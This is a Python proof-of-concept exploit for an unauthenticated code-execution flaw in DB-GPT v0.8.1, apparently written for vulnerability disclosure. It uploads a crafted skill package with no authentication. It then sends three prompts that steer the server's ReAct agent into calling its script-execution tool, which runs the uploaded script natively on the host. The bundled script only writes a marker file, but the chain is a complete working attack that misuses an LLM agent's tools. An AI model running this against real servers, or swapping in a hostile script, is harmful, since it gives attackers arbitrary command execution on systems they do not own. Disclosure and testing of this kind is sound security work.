#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
PoC — DB-GPT v0.8.1 skill-script native execution on the host (unauthenticated remote code execution)
=====================================================================================================
CWE-94: Code Injection

Affected product: DB-GPT v0.8.1 (eosphoros-ai/DB-GPT)
Affected components (code path):
    - packages/dbgpt-core/src/dbgpt/agent/skill/manage.py:941-1049
        SkillManager.execute_skill_script_file(): reads the skill script, wraps it
        minimally, writes a temp file, then asyncio.create_subprocess_exec(sys.executable, tmp_path)
        executes it natively on the host (120 s timeout) - no sandbox, no command
        allowlist, no human confirmation
    - manage.py:588-592
        _should_reject_personal_skill_execution(): rejects personal-skill execution
        only when the environment variable
        DBGPT_DISABLE_PERSONAL_SKILL_SCRIPT_EXECUTION=true; the default config does not reject
    - packages/dbgpt-app/src/dbgpt_app/openapi/api_v1/agentic_data_api.py:548-630
        POST /v1/skills/upload (zero authentication) installs uploaded skill packages into skills/user/

Vulnerability summary:
  The SkillManager of DB-GPT v0.8.1 allows executing Python scripts located in the
  skill directories. execute_skill_script_file() performs no security validation of
  the script - it wraps it minimally and executes it natively with the host Python
  interpreter (sys.executable) as a subprocess. Without any authentication (default
  zero-authentication deployment, listening on 0.0.0.0:5670), an attacker uploads a
  skill package containing a malicious script and then induces the conversational
  agent, via natural language, to invoke the tool and run the script - executing
  arbitrary commands on the server.

Trigger conditions:
  1. The server is network-reachable (default 0.0.0.0:5670, zero authentication)
  2. A malicious skill package is uploaded (zip containing a Python script under scripts/)
  3. The LLM is induced, in a ReAct conversation, to call the execute_skill_script_file
     tool to run the uploaded script

Impact:
  Arbitrary command execution on the server - read/write files, deploy backdoors,
  move laterally. Combined with the default zero-authentication deployment, this is
  credential-free remote code execution.

Verification logic (through the real service API, end to end, unauthenticated throughout):
  [PREREQ]   Confirm the service is reachable
  [STEP 1]   Upload a malicious skill package without authentication (zip containing a marker-writing script)
  [STEP 2]   Call the ReAct conversation endpoint without authentication, inducing the LLM to call
             execute_skill_script_file on the uploaded skill's script
  [STEP 3]   Verify the SSE output shows the execute_skill_script_file tool was invoked
  [STEP 4]   Verify the marker file was created on the server with content POC_EXECUTED (RCE evidence)
  [STEP 5]   Cleanup: delete the marker file + delete the uploaded skill directory

Test environment:
  - DB-GPT v0.8.1 (http://localhost:5670, standard source deployment)
  - Python 3.11+ (urllib standard library, no extra dependencies)
  - Windows 11 / Linux (cross-platform)

Usage:
  python PoC.py [--target http://localhost:5670]
  python PoC.py --target http://<server>:5670 --skills-dir <absolute path>
"""

import io
import json
import os
import shutil
import sys
import tempfile
import time
import urllib.error
import urllib.request
import uuid
import zipfile

TARGET = "http://localhost:5670"
if len(sys.argv) > 2 and sys.argv[1] == "--target":
    TARGET = sys.argv[2]

# Skills root directory of the DB-GPT deployment (when the PoC runs on the same host
# as the server, used to verify/clean up the uploaded skill).
# Pass the actual path via --skills-dir, e.g.: --skills-dir /path/to/DB-GPT/skills
SKILLS_DIR = ""
if "--skills-dir" in sys.argv:
    SKILLS_DIR = sys.argv[sys.argv.index("--skills-dir") + 1]

PASSED = 0
FAILED = 0

# Malicious skill name and script (the script executes natively on the server,
# writing a marker file)
SKILL_NAME = "poc-analyzer"
SCRIPT_NAME = "run.py"
# Marker file: in the server's local temp directory (server and PoC on the same host)
MARKER = os.path.join(tempfile.gettempdir(), "dbgpt_skill_poc_marker.txt").replace("\\", "/")

# Three prompts inducing the LLM to call the execute_skill_script_file tool (backups
# against wording fluctuations)
PROMPTS = [
    "Please use the execute_skill_script_file tool to run the run.py script from the "
    f"skill named {SKILL_NAME}. The script will write a data string to an output file. "
    f"Call the tool with skill_name={SKILL_NAME} and script_file_name=run.py, then run "
    "it and report the output.",
    f"Please call the execute_skill_script_file tool to execute the run.py script in "
    f"the {SKILL_NAME} skill's scripts directory. Use skill_name={SKILL_NAME}, "
    "script_file_name=run.py, then run it.",
    f"Please invoke the execute_skill_script_file tool to run the script run.py of the "
    f"skill {SKILL_NAME}. Pass skill_name={SKILL_NAME} and script_file_name=run.py.",
]


def check(name: str, condition: bool, detail: str = "") -> None:
    """Record a single check result, printed as [PASS] or [FAIL]."""
    global PASSED, FAILED
    if condition:
        PASSED += 1
        print(f"  \033[92m[PASS]\033[0m {name}  {detail}")
    else:
        FAILED += 1
        print(f"  \033[91m[FAIL]\033[0m {name}  {detail}")


def api(method: str, path: str, body=None, timeout: int = 30):
    """Send a JSON HTTP request; return (status code, response text)."""
    data = json.dumps(body).encode("utf-8") if body is not None else None
    h = {"Content-Type": "application/json"}
    req = urllib.request.Request(TARGET + path, data=data, headers=h, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, f"{{'error': {str(e)!r}}}"


def build_skill_zip() -> bytes:
    """Build the malicious skill package (zip) in memory: SKILL.md + scripts/run.py."""
    sk_md = (
        "---\n"
        f"name: {SKILL_NAME}\n"
        "description: Analyze uploaded data files and generate summary reports. "
        "Provides data processing and file output capabilities for text analysis tasks.\n"
        "---\n\n"
        "# PoC Analyzer\n\n"
        "Analyzes data files and outputs processing results.\n"
    )
    script_code = (
        "import os\n\n"
        f'marker = r"{MARKER}"\n'
        "with open(marker, 'w', encoding='utf-8') as f:\n"
        "    f.write('POC_EXECUTED')\n"
        "print('Marker written successfully')\n"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(f"{SKILL_NAME}/SKILL.md", sk_md)
        z.writestr(f"{SKILL_NAME}/scripts/{SCRIPT_NAME}", script_code)
    return buf.getvalue()


def upload_skill(zip_bytes: bytes) -> tuple:
    """Upload the malicious skill package via unauthenticated multipart; return (status, text)."""
    boundary = "----pocboundary" + uuid.uuid4().hex
    body = (
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="file"; filename="{SKILL_NAME}.zip"\r\n'
        f"Content-Type: application/zip\r\n\r\n"
    ).encode("utf-8") + zip_bytes + f"\r\n--{boundary}--\r\n".encode("utf-8")
    h = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    req = urllib.request.Request(
        TARGET + "/api/v1/skills/upload", data=body, headers=h, method="POST"
    )
    try:
        resp = urllib.request.urlopen(req, timeout=60)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def react_chat(prompt: str, conv_uid: str, timeout: int = 180) -> tuple:
    """Call the ReAct conversation endpoint without authentication, inducing the LLM to
    call the execute_skill_script_file tool.

    Returns (HTTP status code, full SSE output text).
    """
    body = {
        "chat_mode": "chat_react_agent",
        "conv_uid": conv_uid,
        "model_name": "deepseek-v4-pro",
        "temperature": 0,
        "user_input": prompt,
    }
    data = json.dumps(body).encode("utf-8")
    h = {"Content-Type": "application/json"}
    req = urllib.request.Request(
        TARGET + "/api/v1/chat/react-agent", data=data, headers=h, method="POST"
    )
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def marker_ok() -> bool:
    """Check that the server-local marker file exists with content POC_EXECUTED."""
    try:
        if not os.path.exists(MARKER):
            return False
        with open(MARKER, encoding="utf-8", errors="replace") as f:
            return f.read().strip() == "POC_EXECUTED"
    except Exception:
        return False


def sse_used_skill_tool(sse_text: str) -> bool:
    """Check whether the SSE output shows the LLM explicitly invoked execute_skill_script_file."""
    return '"action": "execute_skill_script_file"' in sse_text


def skill_installed() -> bool:
    """Check that the malicious skill was installed into skills/user/{SKILL_NAME}."""
    if not SKILLS_DIR:
        return False
    return os.path.isdir(os.path.join(SKILLS_DIR, "user", SKILL_NAME))


def cleanup() -> None:
    """Cleanup: delete the marker file + delete the uploaded skill directory."""
    if os.path.exists(MARKER):
        os.remove(MARKER)
    skill_dir = os.path.join(SKILLS_DIR, "user", SKILL_NAME)
    if os.path.isdir(skill_dir):
        shutil.rmtree(skill_dir)


def main() -> bool:
    global PASSED, FAILED
    print()
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print("\033[1;36m  DB-GPT v0.8.1")
    print("  Skill-script native execution on the host (unauthenticated RCE)  PoC\033[0m")
    print(f"\033[1;36m  Target: {TARGET}\033[0m")
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print()

    # ── Prerequisite check ──
    print("\033[1;33m[PREREQ] Confirm the service is reachable\033[0m")
    code, body = api("GET", "/api/controller/models")
    check("DB-GPT service reachable", code == 200, f"HTTP {code}")
    if code != 200:
        print("  Start the service first: dbgpt start webserver -c <your-config>.toml -y")
        return False
    print()

    # ── STEP 1: upload the malicious skill package without authentication ──
    print("\033[1;33m[STEP 1] Upload the malicious skill package without authentication (zip with a marker-writing script)\033[0m")
    zip_bytes = build_skill_zip()
    code, body = upload_skill(zip_bytes)
    check("skill uploaded", code == 200 and '"success":true' in body,
          f"HTTP {code}  {SKILL_NAME}.zip")
    if SKILLS_DIR:
        check("skill installed into the user directory", skill_installed(), f"user/{SKILL_NAME}/")
    else:
        print("  [SKIP] --skills-dir not given; skipping the local skill-install check")
    print()

    # ── STEP 2: induce the LLM to call execute_skill_script_file without authentication ──
    print("\033[1;33m[STEP 2] Induce the agent via unauthenticated conversation to call execute_skill_script_file\033[0m")
    conv_uid = "poc-skill-" + uuid.uuid4().hex[:8]
    print(f"  conv_uid={conv_uid}")
    if os.path.exists(MARKER):
        os.remove(MARKER)
    sse_full = ""
    used_prompt = 0
    trigger_ok = False
    for i, prompt in enumerate(PROMPTS, start=1):
        used_prompt = i
        print(f"  attempt {i}: sending unauthenticated react-agent request (waiting for the agent to invoke the tool)...")
        st, sse = react_chat(prompt, conv_uid)
        sse_full = sse
        for _ in range(30):
            time.sleep(1)
            if marker_ok():
                trigger_ok = True
                break
        if trigger_ok:
            break
        print(f"  attempt {i} did not trigger (HTTP {st}); retrying with the next prompt ...")
    check("skill script executed natively (marker file POC_EXECUTED)",
          trigger_ok, f"attempt {used_prompt}  marker={MARKER}")
    print()

    # ── STEP 3: verify execute_skill_script_file was invoked in the SSE stream ──
    print("\033[1;33m[STEP 3] Verify the execute_skill_script_file tool was invoked\033[0m")
    used_tool = sse_used_skill_tool(sse_full)
    check("SSE shows the execute_skill_script_file tool was invoked", used_tool,
          "step.meta action=execute_skill_script_file")
    if used_tool:
        for line in sse_full.splitlines():
            if '"action": "execute_skill_script_file"' in line:
                print(f"  evidence: {line[:400]}")
                break
    print()

    # ── STEP 4: verify the RCE evidence ──
    print("\033[1;33m[STEP 4] Verify the server-side marker file content\033[0m")
    content = ""
    if os.path.exists(MARKER):
        with open(MARKER, encoding="utf-8", errors="replace") as f:
            content = f.read().strip()
    check("marker content correct", content == "POC_EXECUTED", f"content: {content!r}")
    print()

    # ── STEP 5: cleanup ──
    print("\033[1;33m[STEP 5] Cleanup (delete the marker file + delete the uploaded skill)\033[0m")
    cleanup()
    if SKILLS_DIR:
        check("skill directory deleted", not skill_installed(), f"user/{SKILL_NAME}/")
    else:
        print("  [SKIP] --skills-dir not given; skipping the local skill-cleanup check")
    if not os.path.exists(MARKER):
        print("  marker file deleted")
    print()

    # ── Summary ──
    total = PASSED + FAILED
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print(f"\033[1;36m  Result: {PASSED}/{total} passed\033[0m")
    if FAILED == 0:
        print("\033[1;36m  Verdict: \033[91mVULNERABLE\033[0m")
        print("\033[1;36m  Skill-script native execution on the host (unauthenticated RCE) confirmed\033[0m")
    else:
        print("\033[1;33m  Verdict: some checks failed - check the service state\033[0m")
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print()
    print("Root cause:")
    print("  manage.py:941-1049       - execute_skill_script_file() reads and executes skill scripts")
    print("  manage.py:1031-1038      - asyncio.create_subprocess_exec(sys.executable, tmp_path)")
    print("  manage.py:588-592        - personal-skill execution not rejected by default")
    print("  agentic_data_api.py:548  - /v1/skills/upload zero-authentication upload")
    print("  -> no authentication + no sandbox + no review confirmation -> CWE-94 arbitrary code execution")
    print()

    return FAILED == 0


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
